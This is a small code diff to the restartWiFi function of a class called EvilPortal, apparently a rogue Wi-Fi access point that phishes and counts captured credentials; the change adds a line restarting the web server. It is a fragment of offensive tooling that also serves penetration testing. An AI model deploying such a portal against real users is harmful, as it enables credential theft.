@@ -97,6 +97,7 @@ void EvilPortal::restartWiFi() {
     webServer.stop();             // Stop Web server
     wifiDisconnect();             // Disconnect WiFi
     WiFi.softAP(apName);          // Start Wi-Fi in AP mode with the SSID
+    webServer.begin();            // Start Web server
     resetCapturedCredentials();   // Reset captured credentials count
 }
 
